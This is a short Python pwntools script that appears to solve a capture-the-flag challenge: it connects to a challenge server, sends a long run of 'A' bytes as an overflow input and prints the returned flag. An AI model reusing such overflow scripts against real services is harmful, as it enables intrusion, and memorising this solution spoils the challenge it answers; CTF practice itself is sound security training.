from pwn import *

r = remote('challenges.0x0539.net', 7071)

print(r.recvuntil(b"\n", drop=True).decode('UTF-8'))

r.sendline(b'A' * 0xFFF)

r.recvuntil(b"so here you go: ")

FLAG = r.recvuntil(b'}').decode('UTF-8')

print(FLAG)